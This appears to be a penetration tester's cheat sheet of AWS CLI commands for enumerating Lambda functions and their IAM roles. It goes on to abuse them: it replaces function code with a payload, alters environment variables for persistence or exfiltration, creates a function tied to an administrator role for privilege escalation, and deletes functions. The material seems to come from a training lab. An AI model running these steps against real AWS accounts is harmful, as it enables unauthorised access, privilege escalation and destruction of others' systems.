# **1. List All Lambda Functions**

```
aws lambda list-functions --region [region]
```

> Shows names, runtimes, ARNs, and last modified dates.
> 

---

# **2. Get Detailed Info on a Function**

## **a. Get full function config (IAM role, runtime, env vars, etc.)**

```
aws lambda get-function-configuration --function-name [function-name]
```

## **b. Get code download URL + deployment details**

```
aws lambda get-function --function-name [function-name]
```

> Returns a pre-signed S3 URL to download the function code.
> 

---

# **3. Check Invocation Access**

## **a. Who/what can invoke the function (resource-based policy)?**

```
aws lambda get-policy --function-name [function-name]
```

> Look for `"Principal": "*"`
> 

---

# **4. Identify Triggers / Event Sources**

## **a. For async event sources like SQS, DynamoDB, Kinesis:**

```
aws lambda list-event-source-mappings --function-name [function-name]
```

## **b. For function URLs (direct HTTP endpoints)**

```
aws lambda get-function-url-config --function-name [function-name]
```

> If `AuthType` is `NONE`, it may be publicly invokable!
> 

---

# **5. Invoke the Function (if allowed)**

```
aws lambda invoke --function-name [function-name] output.json
```

> Add `--payload` if the function expects input:
> 

```
--payload '{"key": "value"}'
```

- Example of invoke certain func

```bash
aws lambda invoke \
  --function-name lambda_privesc_func \
  --log-type Tail \
  --query 'LogResult' \
  --output text \
  --profile chris \
  out.txt | base64 -d
```

---

# **6. Investigate Attached IAM Role**

## **a. Get the role name from `get-function-configuration` (2 stage)**

Then enumerate:

```
aws iam get-role --role-name [role-name]
aws iam list-attached-role-policies --role-name [role-name]
aws iam list-role-policies --role-name [role-name]
```

> Look for overly permissive actions (`*`, `PassRole`, `SecretsManager`, etc.)
> 

---

# **8. Modify or Replace the Function (if you have perms)**

## **a. Update function code**

```
aws lambda update-function-code --function-name [function-name] --zip-file fileb://payload.zip
```

## **b. Update configuration (e.g., env variables)**

```
aws lambda update-function-configuration --function-name [function-name] --environment "Variables={VAR=value}"
```

> Useful for persistence, exfil, or command injection if roles are over-permissioned.
> 

## c. Create lambda func

```bash
aws lambda create-function \
  --function-name lambda_privesc_func \ <--- any name
  --runtime python3.9 \
  --role arn:aws:iam::495599734872:role/cg-debug-role-cgidrcibnofppb \ <--- role with AdministratorAccess
  --handler lambda_test_func.lambda_handler \ <--- file_name.func_name
  --zip-file fileb://function.zip \ <--- zip file with payload script
  --profile assumed_lambda_manager 
```

# **Pro Tip: Region Enumeration**

Not seeing any functions? Always check multiple regions. Many AWS pentests fail early because Lambda functions are deployed outside of `us-east-1`. Cycle through common regions to make sure you aren’t missing anything.

## d. delete funcs

```bash
aws lambda delete-function \
  --function-name [func_name] \
  --profile [profile_name]
```
